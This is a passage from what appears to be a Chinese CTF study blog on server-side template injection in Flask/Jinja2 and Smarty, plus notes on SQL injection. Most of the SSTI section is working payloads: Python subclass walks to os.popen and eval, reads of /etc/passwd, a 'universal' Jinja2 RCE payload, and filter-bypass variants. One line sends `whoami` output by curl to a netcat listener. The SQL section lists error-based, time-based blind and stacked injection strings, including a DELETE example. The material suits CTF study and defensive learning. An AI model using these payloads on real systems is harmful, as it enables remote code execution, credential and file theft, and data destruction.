title="url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等"></a>url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等</h4><p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&apos;json&apos;].JSONEncoder.default.__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="模板注入介绍"><a href="#模板注入介绍" class="headerlink" title="模板注入介绍"></a>模板注入介绍</h3><p><a href="https://xz.aliyun.com/t/3679#toc-10" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a><br><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a><br><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">服务端模板注入攻击</a><br><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html" target="_blank" rel="noopener">CTF SSTI(服务器模板注入)</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SQL 注入</span></span><br><span class="line">$query = <span class="string">"select * from sometable where id="</span>.$_GET[<span class="string">'id'</span>];</span><br><span class="line">mysql_query($query);</span><br><span class="line">------------- 华丽的分割线 -------------</span><br><span class="line"><span class="comment">// 模版注入</span></span><br><span class="line">$temp-&gt;render(<span class="string">"Hello "</span>.$_GET[<span class="string">'username'</span>]);</span><br></pre></td></tr></table></figure><blockquote><p>而服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。 </p><p> ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flask模板注入进行浅析。 </p></blockquote><h3 id="模块引擎"><a href="#模块引擎" class="headerlink" title="模块引擎"></a>模块引擎</h3><p>首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。</p><p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p><p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p><p>后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。</p><p>前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。</p><p>让我们用例子来简析模板渲染。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;div&gt;&#123;$what&#125;&lt;/div&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>我们想要呈现在每个用户面前自己的名字。但是{$what}我们不知道用户名字是什么，用一些url或者cookie包含的信息，渲染到what变量里，呈现给用户的为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;div&gt;张三&lt;/div&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>当然这只是最简单的示例，一般来说，至少会提供分支，迭代。还有一些内置函数。</p><h3 id="模板注入检测"><a href="#模板注入检测" class="headerlink" title="模板注入检测"></a>模板注入检测</h3><p> Twig 模板引擎里，  除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值，例如这里用户输入 name=20 ，则在服务端拼接的模版内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello &#123;&#123;<span class="number">2</span>*<span class="number">10</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>Twig 模板引擎在编译模板的过程中会计算 20  中的表达式 2*10 ，会将其返回值 20  作为模板变量的值输出</p><h3 id="利用ssti攻击"><a href="#利用ssti攻击" class="headerlink" title="利用ssti攻击"></a>利用ssti攻击</h3><p>在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。我们从这段话出发，假定你已经知道ssti漏洞了，但是完全没学过ssti代码怎么写，接下来你可能会学到一点废话。</p><p>我们在pycharm中运行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;&quot;.__class__)</span><br></pre></td></tr></table></figure><p>返回了&lt;class ‘str’&gt;，对于一个空字符串他已经打印了str类型，在python中，每个类都有一个<strong>bases</strong>属性，列出其基类。现在我们写代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__bases__)</span><br></pre></td></tr></table></figure><p>打印返回(&lt;class ‘object’&gt;,)，我们已经找到了他的基类object，而我们想要寻找object类的不仅仅只有bases，同样可以使用<strong>mro</strong>，<strong>mro</strong>给出了method resolution order，即解析方法调用的顺序。我们实例打印一下mro。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__mro__)</span><br></pre></td></tr></table></figure><p>可以看到返回了(&lt;class ‘str’&gt;, &lt;class ‘object’&gt;)，同样可以找到object类，正是由于这些但不仅限于这些方法，我们才有了各种沙箱逃逸的姿势。正如上面的解释，<strong>mro</strong>返回了解析方法调用的顺序，将会打印两个。在flask ssti中poc中很大一部分是从object类中寻找我们可利用的类的方法。我们这里只举例最简单的。接下来我们增加代码。接下来我们使用subclasses,<strong>subclasses</strong>() 这个方法，这个方法返回的是这个类的子类的集合，也就是object类的子类的集合。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__bases__[0].__subclasses__())</span><br></pre></td></tr></table></figure><p>python 3.6 版本下的object类下的方法集合。这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。需要自己寻找合适的标号来调用接下来我将进一步解释。接下来就是我们需要找到合适的类，然后从合适的类中寻找我们需要的方法。这里开始我们不再用pycharm打印了，直接利用上面我们已经搭建好的漏洞环境来进行测试。通过我们在如上这么多类中一个一个查找，找到我们可利用的类，这里举例一种。&lt;class ‘os._wrap_close’&gt;，os命令相信你看到就感觉很亲切。我们正是要从这个类中寻找我们可利用的方法，通过大概猜测找到是第118个类，0也对应一个类，所以这里写[118]。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117]&#125;&#125;</span><br></pre></td></tr></table></figure><p>这个时候我们便可以利用.<strong>init</strong>.<strong>globals</strong>来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p>此时我们可以在网页上看到各种各样的参数方法函数。我们找其中一个可利用的function popen，在python2中可找file读取文件，很多可利用方法，详情可百度了解下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__[&apos;popen&apos;](&apos;dir&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p> 此时便可以看到命令已经执行。如果是在linux系统下便可以执行其他命令。此时我们已经成功得到权限。进下来我们将进一步简单讨论如何进行沙箱逃逸。 </p><h3 id="ssti步骤"><a href="#ssti步骤" class="headerlink" title="ssti步骤"></a>ssti步骤</h3><h4 id="获取基本类"><a href="#获取基本类" class="headerlink" title="获取基本类"></a>获取基本类</h4><p>首先通过str、dict、tuple或list获取python的基本类(当然也可以利用一些其他在jinja2中存在的对象，比如request)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[8]</span><br></pre></td></tr></table></figure><p>可以借助getitem绕过中括号限制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__.__getitem__(2)</span><br><span class="line">&#123;&#125;.__class__.__bases__.__getitem__(0)</span><br><span class="line">().__class__.__bases__.__getitem__(0)</span><br><span class="line">request.__class__.__mro__.__getitem__(8)</span><br></pre></td></tr></table></figure><h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[40]  为file类，所以可以对文件进行操作</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">读文件：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[40](&apos;/etc/passwd&apos;).read()</span><br><span class="line"></span><br><span class="line">写文件：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[40](&apos;/tmp&apos;).write(&apos;test&apos;)</span><br></pre></td></tr></table></figure><h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[59].__init__.func_globals.linecache下直接有os类，可以直接执行命令：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;id&apos;).read()</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&apos;os&apos;).popen(&apos;id&apos;).read()</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).popen(&apos;id&apos;).read()</span><br></pre></td></tr></table></figure><h2 id="Jinjia2模板引擎通用的RCE-Payload："><a href="#Jinjia2模板引擎通用的RCE-Payload：" class="headerlink" title="Jinjia2模板引擎通用的RCE Payload："></a>Jinjia2模板引擎通用的RCE Payload：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;&lt;command&gt;&apos;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p> 在<command>添加命令即可 </p><h2 id="ctf中的一些绕过tips"><a href="#ctf中的一些绕过tips" class="headerlink" title="ctf中的一些绕过tips"></a>ctf中的一些绕过tips</h2><p>没什么系统思路。就是不断挖掘类研究官方文档以及各种能够利用的姿势。这里从最简单的绕过说起。</p><h3 id="过滤-等括号"><a href="#过滤-等括号" class="headerlink" title="过滤[]等括号"></a>过滤[]等括号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用getitem绕过。如原poc &#123;&#123;&quot;&quot;.__class__.__bases__[0]&#125;&#125;</span><br><span class="line"></span><br><span class="line">绕过后&#123;&#123;&quot;&quot;.__class__.__bases__.__getitem__(0)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读文件：</span><br><span class="line">&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&apos;/etc/passwd&apos;).read()</span><br><span class="line">执行命令：</span><br><span class="line">&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&apos;ls&apos;).read()</span><br></pre></td></tr></table></figure><h3 id="过滤class"><a href="#过滤class" class="headerlink" title="过滤class"></a>过滤class</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用session</span><br><span class="line"></span><br><span class="line">poc &#123;&#123;session[&apos;__cla&apos;+&apos;ss__&apos;].__bases__[0].__bases__[0].__bases__[0].__bases__[0].__subclasses__()[118]&#125;&#125;</span><br></pre></td></tr></table></figure><p>多个bases[0]是因为一直在向上找object类。使用mro就会很方便</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[&apos;__cla&apos;+&apos;ss__&apos;].__mro__[12]&#125;&#125;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request[&apos;__cl&apos;+&apos;ass__&apos;].__mro__[12]&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="timeit姿势"><a href="#timeit姿势" class="headerlink" title="timeit姿势"></a>timeit姿势</h3><p>可以学习一下 2017 swpu-ctf的一道沙盒python题，</p><p>这里不详说了，博大精深，我只意会一二。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import timeit</span><br><span class="line">timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;,number=1)</span><br><span class="line"></span><br><span class="line">import platform</span><br><span class="line">print platform.popen(&apos;dir&apos;).read()</span><br></pre></td></tr></table></figure><h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">先获取chr函数，赋值给chr，后面拼接字符串就好了：</span><br><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br><span class="line">借助request对象(推荐)：</span><br><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br><span class="line">执行命令：</span><br><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id</span><br></pre></td></tr></table></figure><h3 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线__"></a>过滤双下划线__</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">过滤&#123;&#123;</span><br><span class="line">可以利用&#123;%if%&#125; &#123;% endif %&#125;标记</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;curl http://127.0.0.1:7999/?i=`whoami`&apos;).read()==&apos;p&apos; %&#125;1&#123;% endif %&#125;</span><br><span class="line">nc -nlvp 7999</span><br><span class="line">相当于盲命令执行，利用curl将执行结果带出来</span><br><span class="line">如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</span><br><span class="line">&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/test&apos;).read()[0:1]==&apos;p&apos; %&#125;~p0~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤关键词"><a href="#过滤关键词" class="headerlink" title="过滤关键词"></a>过滤关键词</h3><p><strong>base64编码绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__getattribute__使用实例访问属性时,调用该方法</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如被过滤掉__class__关键词</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(&apos;X19jbGFzc19f&apos;.decode(&apos;base64&apos;)).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>字符串拼接绕过</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(&apos;__c&apos;+&apos;lass__&apos;).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__class__.__base__.__subclasses__()[131].__init__.__globals__[&apos;__builtins__&apos;][&apos;ev&apos;+&apos;al&apos;](&apos;__im&apos;+&apos;port__(&quot;o&apos;+&apos;s&quot;).po&apos;+&apos;pen(&quot;cat /this_is_the_fl&apos;+&apos;ag.txt&quot;)&apos;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&apos;&apos;.__class__.__base__.__subclasses__()[77].__init__.__globals__[&apos;sys&apos;].modules[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;po&apos;+&apos;pen&apos;](&apos;cat /this_is_the_fl&apos;+&apos;ag.txt&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>python还有一些内置函数，比如url_for和get_flashed_messages </p></blockquote><p><strong>get_flashed_messages</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</span><br></pre></td></tr></table></figure><h2 id="测试一下是否是smarty"><a href="#测试一下是否是smarty" class="headerlink" title="测试一下是否是smarty"></a>测试一下是否是smarty</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7&#123;*comment*&#125;7   77</span><br></pre></td></tr></table></figure><h2 id="smarty-常用payload"><a href="#smarty-常用payload" class="headerlink" title="smarty 常用payload"></a>smarty 常用payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&apos;ls&apos;)&#125;&#123;/if&#125;</span><br><span class="line">&#123; readfile(&apos;/flag&apos;) &#125;</span><br><span class="line">&#123;if show_source(&apos;/flag&apos;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&apos;cat ../../../flag&apos;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/03/17/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<blockquote><ul><li>对表名为纯数字的表进行操作时，要在前后加上`符号。</li><li>对列名进行更改时，要在后面指定修改后的数据类型  </li><li>盲注时候多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</li><li>SQL注入常用URL编码<br>空格 %20<br>‘ %27<br># %23<br>\ %5C</li><li>php-addslashes函数：在特殊字符前加上反斜线\来转义</li><li>如何从addslashes函数逃逸？<ul><li><code>\</code>前面再加一个<code>\</code>，变成<code>\\&#39;</code>，这样\就被转义了</li><li>把\弄没</li></ul></li><li>表名或列名可以使用16进制转码来实现<br>例如：ctf -&gt; 0x637466<br>sqlmap中加参数<code>--hex</code></li></ul></blockquote><a id="more"></a><h1 id="sql注入12个报错方式"><a href="#sql注入12个报错方式" class="headerlink" title="sql注入12个报错方式"></a>sql注入12个报错方式</h1><p><a href="https://www.bugku.com/forum.php?mod=viewthread&tid=93&extra=page%3D1%26filter%3Dtypeid%26typeid%3D26" target="_blank" rel="noopener">sql注入12个报错方式</a></p><blockquote><p>1、通过floor报错,注入语句如下:<br>and select 1 from (select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);</p><p>2、通过ExtractValue报错,注入语句如下:<br>and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p><p>3、通过UpdateXml报错,注入语句如下:<br>and 1=(updatexml(1,concat(0x3a,(select user())),1))</p><p>4、通过NAME_CONST报错,注入语句如下:<br>and exists(select<em>from (select</em>from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</p><p>5、通过join报错,注入语句如下:<br>select * from(select * from mysql.user ajoin mysql.user b)c;</p><p>6、通过exp报错,注入语句如下:<br>and exp(~(select * from (select user () ) a) );</p><p>7、通过GeometryCollection()报错,注入语句如下:<br>and GeometryCollection(()select *from(select user () )a)b );</p><p>8、通过polygon ()报错,注入语句如下:<br>and polygon (()select * from(select user ())a)b );</p><p>9、通过multipoint ()报错,注入语句如下:<br>and multipoint (()select * from(select user() )a)b );</p><p>10、通过multlinestring ()报错,注入语句如下:<br>and multlinestring (()select * from(selectuser () )a)b );</p><p>11、通过multpolygon ()报错,注入语句如下:<br>and multpolygon (()select * from(selectuser () )a)b );</p><p>12、通过linestring ()报错,注入语句如下:<br>and linestring (()select * from(select user() )a)b );</p></blockquote><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p> 原理：能够截取字符串，同时触发延时即可<br><code>SELECT * FROM table WHERE id = 1 AND (if(SUBSTR(database(),1,1)=&#39; &#39;,sleep(5),null))</code><br><code>SELECT * FROM table WHERE id = 1 AND (if(acsii(substr(database(),1,1))=100,sleep(5),null))</code> </p><p>相关函数</p><ul><li><p>延时方法</p><ul><li>SLEEP(duration)<br><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/sleep.png" alt></li></ul></li><li><p>BENCHMARK(count,expr)<br>  <img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/benchmark.png" alt></p><ul><li>例如<code>select benchmark(10000000,sha(1))</code></li><li>笛卡尔积<br>例如<code>SELECT count(*) FROM information_schema.columns A,information_schema.columns B, information_schema.tables C;</code><br>ps:COUNT(*)计算行数</li><li>GET_LOCK(str,timeout)<br>需要开启两个会话才能生效<br><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/GET_LOCK.png" alt></li><li>RLIKE<br>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短<br>例如<code>select concat(rpad(1,9999999,&#39;a&#39;),rpad(1,9999999,&#39;a&#39;),···,rpad(1,9999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+···+(a.*)+b</code><br><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/RLIKE.png" alt></li><li>条件<ul><li>IF(expr1,expr2,expr3)<br><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/IF.png" alt></li></ul></li><li>CASE WHEN [condition] when [result]<br><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/CASE.png" alt></li><li>字符串截取<ul><li>SUBSTR(SUBSTRING)<br>substr同substring，有多种参数选择<br><code>SUBSTRING(str,pos)</code>, <code>SUBSTRING(str FROM pos)</code>, <code>SUBSTRING(str,pos,len)</code>, <code>SUBSTRING(str FROM pos FOR len)</code><br><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/SUBSTR.png" alt></li></ul></li><li>MID(str,pos,len)同SUBSTRING(str,pos,len)</li><li>SUBSTRING_INDEX(str,delim,count)<br><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/SUBSTRING_INDEX.png" alt></li><li>LEFT(str,len)<br><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/LEFT.png" alt></li><li>字符串转换<ul><li>ASCII()</li><li>ORD()</li><li>CHR()</li></ul></li></ul></li></ul><p>​    </p><h1 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h1><blockquote><p>在PHP中，<code>mysqli_multi_query()</code>函数可以多语句查询SQL </p></blockquote><blockquote><p>​    在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products; 服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products;当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 </p></blockquote><h1 id="mysql查询语句-handler"><a href="#mysql查询语句-handler" class="headerlink" 